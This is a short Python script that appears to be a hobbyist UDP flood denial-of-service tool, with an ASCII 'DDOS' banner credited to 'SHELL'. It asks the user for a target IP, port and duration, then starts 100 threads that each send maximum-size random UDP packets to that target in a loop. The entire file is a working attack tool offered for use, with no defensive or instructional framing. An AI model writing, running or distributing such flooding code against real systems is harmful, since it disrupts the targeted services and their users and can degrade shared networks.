import time
import socket# import cum socks
import random
from colorama import Fore as color
from threading import Thread
import os


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def menu():
  print(f"""{color.RED} 
  
            ╔═════════════════════════╗
            ║          𝗗𝗗𝗢𝗦           ║  
            ╚════════════╬════════════╝
            ╔════════════╬════════════╗
            ║  █▀█ █▀▄▀█ █▀▀ █▀▀ ▄▀█  ║
            ║  █▄█ █░▀░█ ██▄ █▄█ █▀█  ║
            ╚════════════╬════════════╝
            ╔════════════╬════════════╗
            ║     𝗠𝗔𝗗𝗘 𝗕𝗬 𝗦𝗛𝗘𝗟𝗟       ║
            ╚═════════════════════════╝
  
  {color.RESET}""")


def send(ip, port, duration):
  data = random._urandom(65507) 
  timeout = time.time() + duration  
  while True:
    if time.time() > timeout:
      break
    sock.sendto(data,(ip, port))
    print(f"{color.GREEN}SENT PACKET TO: {ip}:{port}{color.RESET}")



def main(ip, port, duration):
  print(f"{color.BLUE}STARTED DDOS TO: {ip}:{port}{color.RESET}")
  try:
    for i in range(100): #Adding more threads means more speed however can be more memory intensive
      Thread(target=send, args=(ip, port, duration)).start()
  except Exception:
    pass
  print(f"{color.BLUE}FINISHED DDOS TO: {ip}:{port}{color.RESET}")
  


while True:
  menu()
  time.sleep(1.5)
  ip = input(f"{color.GREEN}Please input the IP here ---> {color.RESET}")
  port = int(input(f"{color.GREEN}Please input the Port here ---> {color.RESET}"))
  duration = int(input(f"{color.GREEN}Please input the duration in seconds ---> {color.RESET}"))
  main(ip, port, duration)

  
  # Do os.system('cls') instead if you are a windows user
  


